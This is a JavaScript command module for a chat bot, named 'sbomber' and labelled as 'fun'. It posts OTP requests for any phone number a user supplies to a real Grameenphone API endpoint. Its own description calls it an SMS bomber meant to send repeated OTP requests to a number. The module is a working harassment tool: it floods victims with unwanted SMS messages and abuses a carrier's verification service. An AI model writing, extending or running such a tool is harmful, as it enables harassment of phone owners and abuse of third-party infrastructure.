const axios = require("axios");

module.exports = {
  config: {
    name: "sbomber",
    version: "1.0",
    author: "Rahad",
    countDown: 5,
    role: 0,
    shortDescription: "Send SMS bomber request",
    longDescription: "Send repeated OTP request to a number using GP API",
    category: "fun",
    guide: {
      en: "{p}sbomber <phone_number>"
    }
  },

  onStart: async function ({ event, args, message }) {
    const phoneNumber = args[0];

    if (!phoneNumber) {
      return message.reply("📌 Use: /sbomber <phone_number>");
    }

    const API_URL = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp";

    const data = {
      phone: phoneNumber,
      email: "",
      language: "en"
    };

    try {
      const res = await axios.post(API_URL, data, {
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0"
        }
      });

      return message.reply(`✅ Response: ${JSON.stringify(res.data)}`);
    } catch (err) {
      return message.reply(`❌ Error: ${err.message}`);
    }
  }
};
